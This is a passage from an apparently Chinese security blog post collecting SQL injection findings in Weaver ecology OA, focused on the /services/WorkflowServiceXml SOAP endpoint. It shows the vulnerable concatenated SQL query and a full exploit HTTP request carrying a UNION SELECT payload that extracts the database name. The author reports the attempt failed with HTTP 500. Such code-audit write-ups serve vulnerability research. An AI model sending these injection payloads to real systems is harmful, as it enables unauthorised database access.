+<h1 id="services-workflowservicexml"><a href="#services-workflowservicexml" class="headerlink" title="&#x2F;services&#x2F;workflowservicexml"></a>&#x2F;services&#x2F;workflowservicexml</h1><p><a class="link"   target="_blank" rel="noopener" href="https://sn1per-ssd.github.io/2024/08/15/ecology9%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" >https://sn1per-ssd.github.io/2024/08/15/ecology9%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/<i class="fas fa-external-link-alt"></i></a></p>
+<p>也是一个WebService接口</p>
+<p><img   src="/2025/05/03/JNI/L%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/image-1754814883013.png"  alt="img"></p>
+<p>主要是控制i4，最后调用getWorkflowRequestList会执行sql查询。不过这里我还是没复现成功，响应码一直是500</p>
+<p>最终的语句是这样的，在var4处自行拼接即可，不过不清楚过滤机制，有些会被过滤：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> t1.createdate, t1.createtime, t1.creater, t1.currentnodeid, t1.currentnodetype</span><br><span class="line">        , t1.lastoperator, t1.creatertype, t1.lastoperatortype, t1.lastoperatedate, t1.lastoperatetime</span><br><span class="line">        , t1.requestid, t1.requestname, t1.requestlevel, t1.workflowid, t2.receivedate</span><br><span class="line">        , t2.receivetime</span><br><span class="line"><span class="keyword">FROM</span> workflow_requestbase t1, workflow_currentoperator t2</span><br><span class="line"><span class="keyword">WHERE</span> t1.requestid <span class="operator">=</span> t2.requestid</span><br><span class="line">        <span class="keyword">AND</span> t2.usertype <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">AND</span> t2.userid <span class="operator">=</span> &#123;var4&#125;</span><br><span class="line">        <span class="keyword">AND</span> t2.isremark <span class="operator">=</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line">        <span class="keyword">AND</span> t2.iscomplete <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">AND</span> t2.islasttimes <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">AND</span> &#123;var5&#125;</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> t2.receivedate <span class="keyword">DESC</span>, t2.receivetime <span class="keyword">DESC</span>, t1.requestid <span class="keyword">DESC</span></span><br><span class="line">LIMIT <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>exp：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/services/WorkflowServiceXml</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;132&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1:8090/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>ecology_JSessionid=aaaTFu27tf_OB7M3KLrIz; JSESSIONID=aaaTFu27tf_OB7M3KLrIz; __randcode__=a5cddb6a-5dc6-4cab-a850-d79303048e8f</span><br><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>&quot;6VlXQDoaXNs&quot;</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Fri, 08 Aug 2025 01:39:01 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>615</span><br><span class="line"></span><br><span class="line"><span class="language-vim">&lt;soapen<span class="variable">v:Envelope</span> xmln<span class="variable">s:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> xmln<span class="variable">s:web</span>=<span class="string">&quot;http://webservices.workflow.weaver&quot;</span>&gt; &lt;soapen<span class="variable">v:Header</span>/&gt;</span></span><br><span class="line"><span class="language-vim">  &lt;soapen<span class="variable">v:Body</span>&gt;</span></span><br><span class="line"><span class="language-vim">      &lt;we<span class="variable">b:getHendledWorkflowRequestList</span>&gt;</span></span><br><span class="line"><span class="language-vim">        &lt;we<span class="variable">b:in0</span>&gt;<span class="number">1</span>&lt;/we<span class="variable">b:in0</span>&gt;</span></span><br><span class="line"><span class="language-vim">        &lt;we<span class="variable">b:in1</span>&gt;<span class="number">1</span>&lt;/we<span class="variable">b:in1</span>&gt;</span></span><br><span class="line"><span class="language-vim">        &lt;we<span class="variable">b:in2</span>&gt;<span class="number">1</span>&lt;/we<span class="variable">b:in2</span>&gt;</span></span><br><span class="line"><span class="language-vim">        &lt;we<span class="variable">b:in3</span>&gt;<span class="number">1</span>&lt;/we<span class="variable">b:in3</span>&gt;</span></span><br><span class="line"><span class="language-vim">        &lt;we<span class="variable">b:in4</span>&gt;</span></span><br><span class="line"><span class="language-vim">            &lt;we<span class="variable">b:string</span>&gt;<span class="number">1</span>=<span class="number">1</span> UNION SELECT CONCAT(<span class="number">0</span>x616263,database(),<span class="number">0</span>x646667),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#</span></span><br><span class="line"><span class="language-vim">&lt;/we<span class="variable">b:string</span>&gt;</span></span><br><span class="line"><span class="language-vim">        &lt;/we<span class="variable">b:in4</span>&gt;</span></span><br><span class="line"><span class="language-vim">      &lt;/we<span class="variable">b:getHendledWorkflowRequestList</span>&gt;</span></span><br><span class="line"><span class="language-vim">  &lt;/soapen<span class="variable">v:Body</span>&gt;</span></span><br><span class="line"><span class="language-vim">&lt;/soapen<span class="variable">v:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                泛微SQL注入整理
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2025/08/10/泛微SQL注入整理/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">1diot9</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2025-08-10 16:33</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2025/08/10/changeUserInfo%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-ofsLogin%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/"
+                                   title="changeUserInfo信息泄露+ofsLogin任意用户登录"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">changeUserInfo信息泄露+ofsLogin任意用户登录</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/08/10/%E6%B3%9B%E5%BE%AEecology9%E5%89%8D%E7%BD%AE/"
+                                   title="泛微ecology9前置"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">泛微ecology9前置</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#service-BlogService"><span class="nav-number">2.</span> <span class="nav-text">&#x2F;service&#x2F;BlogService</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WebService"><span class="nav-number">2.1.</span> <span class="nav-text">WebService</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SOAP%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.2.</span> <span class="nav-text">SOAP协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WSDL%E6%96%87%E6%A1%A3"><span class="nav-number">2.3.</span> <span class="nav-text">WSDL文档</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.4.</span> <span class="nav-text">漏洞分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#services-workflowservicexml"><span class="nav-number">3.</span> <span class="nav-text">&#x2F;services&#x2F;workflowservicexml</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">1diot9</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">48.3k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#service-BlogService"><span class="nav-number">2.</span> <span class="nav-text">&#x2F;service&#x2F;BlogService</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WebService"><span class="nav-number">2.1.</span> <span class="nav-text">WebService</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SOAP%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.2.</span> <span class="nav-text">SOAP协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WSDL%E6%96%87%E6%A1%A3"><span class="nav-number">2.3.</span> <span class="nav-text">WSDL文档</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.4.</span> <span class="nav-text">漏洞分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#services-workflowservicexml"><span class="nav-number">3.</span> <span class="nav-text">&#x2F;services&#x2F;workflowservicexml</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
